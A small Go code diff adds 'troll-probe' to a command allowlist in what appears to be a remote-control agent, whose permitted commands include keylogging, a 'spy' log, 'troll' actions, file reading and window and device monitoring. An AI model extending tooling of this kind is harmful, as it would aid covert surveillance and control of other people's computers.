@@ -138,6 +138,7 @@ func modeAllows(mode, cmd string) bool {
 			"get-timezone", "list-directory", "read-file", "get-file-info",
 			"get-file-hash", "get-file-version", "get-agent-log",
 			"get-agent-debug-log", "get-spy-log", "keylog", "troll-status",
+			"troll-probe",
 			"get-session-state",
 			"get-foreground-window", "get-active-window", "get-display-info",
 			"get-monitors", "get-screen-size", "get-audio-devices",
